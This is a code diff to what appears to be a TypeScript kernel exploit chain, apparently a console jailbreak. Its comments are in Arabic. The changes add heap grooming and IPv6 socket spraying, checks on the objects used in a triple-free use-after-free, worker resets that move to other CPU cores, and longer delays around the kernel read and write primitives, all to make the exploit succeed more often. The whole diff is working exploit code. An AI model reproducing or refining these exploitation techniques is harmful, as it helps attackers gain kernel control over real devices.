@@ -162,6 +162,11 @@ let FW_VERSION: string | null = null // Needs to be initialized to patch kernel
 let leak_kqueue_failures = 0
 let kreadslow_failures = 0
 let kwriteslow_failures = 0
+let worker_resets = 0
+const MAX_WORKER_RESETS = 3
+
+let current_core = MAIN_CORE   // 4 عندك
+const CORE_LIST = [4, 3, 5]    // cores بديلة
 
 const MAX_LEAKKQ_FAIL   = 3      // بعدهم نعلن فشل نهائي
 const MAX_KREAD_FAIL    = 2      // عدد محاولات kreadslow قبل ما نرجع false
@@ -546,6 +551,22 @@ function wait_iov_recvmsg () {
   }
 
   // debug("iov_recvmsg workers run OK");
+}
+
+function prespray_ipv6 () {
+  log('Pre-spraying IPv6 sockets...')
+
+  // نعمل مجموعة تخصيصات IPv6
+  for (let i = 0; i < 150; i++) {
+    const s = socket(AF_INET6, SOCK_STREAM, 0)
+    free_rthdr(s)
+    close(s)
+  }
+
+  // ندي kernel فرصة يرتّب الذاكرة
+  nanosleep_fun(5_000_000) // 5ms
+
+  log('IPv6 pre-spray complete')
 }
 
 function trigger_ipv6_spray_and_read () {
@@ -1013,7 +1034,30 @@ function netctrl_exploit () {
   yield_to_render(exploit_phase_setup)
 }
 
+function heap_conditioning () {
+  log('Conditioning kernel heap...')
+
+  // نعمل مجموعة تخصيصات صغيرة
+  for (let i = 0; i < 200; i++) {
+    const s = socket(AF_UNIX, SOCK_STREAM, 0)
+    close(s)
+  }
+
+  // نعمل مجموعة تخصيصات IPv6
+  for (let i = 0; i < 100; i++) {
+    const s = socket(AF_INET6, SOCK_STREAM, 0)
+    free_rthdr(s)
+    close(s)
+  }
+
+  // ندي kernel فرصة يرتّب الذاكرة
+  nanosleep_fun(10_000_000) // 10ms
+
+  log('Heap conditioning complete')
+}
+
 function exploit_phase_setup () {
+  heap_conditioning()
   setup()
   log('Workers spawned')
   exploit_count = 0
@@ -1033,6 +1077,8 @@ function exploit_phase_trigger () {
 
   exploit_count++
   log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...')
+  
+  prespray_ipv6()
 
   if (!trigger_ucred_triplefree()) {
     // فشل في triple free → نعيد المحاولة من نفس الفيز
@@ -1044,7 +1090,38 @@ function exploit_phase_trigger () {
   yield_to_render(exploit_phase_leak)
 }
 
+function validate_triplets (): boolean {
+  log('Validating triplets...')
+
+  // نعيد إيجاد triplet 1
+  const t1 = find_triplet(triplets[0], -1)
+  if (t1 < 0) {
+    log('Triplet validation failed: could not find triplet 1')
+    return false
+  }
+
+  // نعيد إيجاد triplet 2
+  const t2 = find_triplet(triplets[0], t1)
+  if (t2 < 0) {
+    log('Triplet validation failed: could not find triplet 2')
+    return false
+  }
+
+  // لو وصلنا هنا → triplets سليمة
+  triplets[1] = t1
+  triplets[2] = t2
+
+  log('Triplets validated: [' + triplets[0] + ', ' + t1 + ', ' + t2 + ']')
+  return true
+}
+
 function exploit_phase_leak () {
+  if (!validate_triplets()) {
+    log('Triplet validation failed, retrying trigger...')
+    yield_to_render(exploit_phase_trigger)
+    return
+  }
+
   if (!leak_kqueue_safe()) {
     log('[leak_kqueue_safe] failed, retrying...')
     yield_to_render(exploit_phase_trigger)
@@ -1328,6 +1405,16 @@ function remove_uaf_file () {
   }
 }
 
+function dynamic_delay (base: number, factor: number): void {
+  // base = 5ms أو 10ms
+  // factor = عدد الفشل أو iterations
+  let delay = base + (factor * 2_000_000) // كل فشل يزود 2ms
+
+  if (delay > 20_000_000) delay = 20_000_000 // حد أقصى 20ms
+
+  nanosleep_fun(delay)
+}
+
 function trigger_ucred_triplefree () {
   let end = false
 
@@ -1473,6 +1560,8 @@ function trigger_ucred_triplefree () {
   return true
 }
 
+
+
 function leak_kqueue () {
   debug('Leaking kqueue...')
 
@@ -1495,6 +1584,8 @@ function leak_kqueue () {
 
     if (count % 500 === 0) {
       debug('leak_kqueue iter=' + count + ' (MAX=' + MAX_KQ + ')')
+
+      dynamic_delay(2_000_000, count / 500)
     }
 
     kq = kqueue()
@@ -1546,6 +1637,10 @@ function leak_kqueue_safe () {
     const ok = leak_kqueue()
     if (!ok) {
       log('leak_kqueue_safe() failed (attempts=' + leak_kqueue_failures + ')')
+
+      if (leak_kqueue_failures >= 2 && worker_resets < MAX_WORKER_RESETS) {
+        reset_workers()
+      }
     }
     return ok
   } catch (e) {
@@ -1555,6 +1650,27 @@ function leak_kqueue_safe () {
   }
 }
 
+function reset_workers () {
+  worker_resets++
+
+  log('Resetting workers (attempt ' + worker_resets + '/' + MAX_WORKER_RESETS + ')')
+
+  // اقتل كل الـ workers
+  cleanup(true)
+
+  // بدّل الـ core لو لزم الأمر
+  current_core = CORE_LIST[worker_resets % CORE_LIST.length]
+  log('Switching exploit core to ' + current_core)
+
+  pin_to_core(current_core)
+
+  // أنشئ workers من جديد
+  create_workers()
+  init_workers()
+
+  // ندي kernel فرصة يهدى
+  nanosleep_fun(10_000_000) // 10ms
+}
 
 function kreadslow64 (address: BigInt) {
   const buffer = kreadslow(address, 8)
@@ -1569,9 +1685,14 @@ function kreadslow64 (address: BigInt) {
 function kreadslow64_safe (address: BigInt): BigInt {
   for (let attempt = 1; attempt <= MAX_KREAD_FAIL; attempt++) {
     const buffer = kreadslow(address, 8)
+    
+    kreadslow_failures++
 
     if (buffer.eq(BigInt_Error)) {
-      kreadslow_failures++
+      if (kreadslow_failures >= 1 && worker_resets < MAX_WORKER_RESETS) {
+        reset_workers()
+      }
+      
       log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' +
           hex(address) + ' (attempt ' + attempt + '/' + MAX_KREAD_FAIL + ')')
 
@@ -1581,7 +1702,7 @@ function kreadslow64_safe (address: BigInt): BigInt {
       }
 
       // ندي الـ kernel فرصة يهدى
-      nanosleep_fun(5_000_000) // 5ms
+      dynamic_delay(5_000_000, kreadslow_failures)
       continue
     }
 
@@ -1944,12 +2065,18 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
   return new BigInt(0)
 }
 
+
+
 function kwriteslow_safe (addr: BigInt, buffer: BigInt, size: number): BigInt {
   for (let attempt = 1; attempt <= MAX_KWRITE_FAIL; attempt++) {
     const ret = kwriteslow(addr, buffer, size)
 
     if (ret.eq(BigInt_Error)) {
+      
       kwriteslow_failures++
+      if (kwriteslow_failures >= 1 && worker_resets < MAX_WORKER_RESETS) {
+        reset_workers()
+      }
       log('kwriteslow_safe: kwriteslow returned BigInt_Error at addr ' +
           hex(addr) + ' (attempt ' + attempt + '/' + MAX_KWRITE_FAIL + ')')
 
@@ -1957,7 +2084,7 @@ function kwriteslow_safe (addr: BigInt, buffer: BigInt, size: number): BigInt {
         throw new Error('Netctrl failed - Reboot and try again')
       }
 
-      nanosleep_fun(5_000_000) // 5ms
+      dynamic_delay(5_000_000, kwriteslow_failures)
       continue
     }
 
